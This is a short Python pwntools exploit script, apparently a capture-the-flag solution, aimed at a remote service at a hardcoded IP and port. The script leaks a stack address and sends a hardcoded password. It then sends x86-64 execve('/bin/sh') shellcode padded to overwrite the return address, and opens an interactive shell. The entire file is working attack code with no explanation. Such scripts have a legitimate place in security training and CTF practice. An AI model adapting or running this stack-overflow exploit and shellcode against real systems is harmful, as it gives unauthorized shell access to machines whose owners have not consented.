#!/bin/python3
from pwn import *
def main():
        password = b"b4tp@$$w0rd!"
        return_address = 84
        r = remote('167.71.137.246', 31278)

        r.sendlineafter(b"> ",b"1")

        stack_address = r.recvline().strip().split()[-1]
        stack_address = int(stack_address,16)

        r.recvuntil(b"> ")
        r.sendline(b"2")
        r.recvuntil(b"password: ")
        r.sendline(password)
        
        shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

        padding = b'0' * (return_address - len(shellcode))

        payload = shellcode + padding + p64(stack_address)
        r.sendlineafter(b"commands: ", bytes(payload))

        r.sendlineafter(b'> ', b'3')
        log.success("Terminal access granted!!!")
        r.interactive()

if __name__=='__main__':
        main()

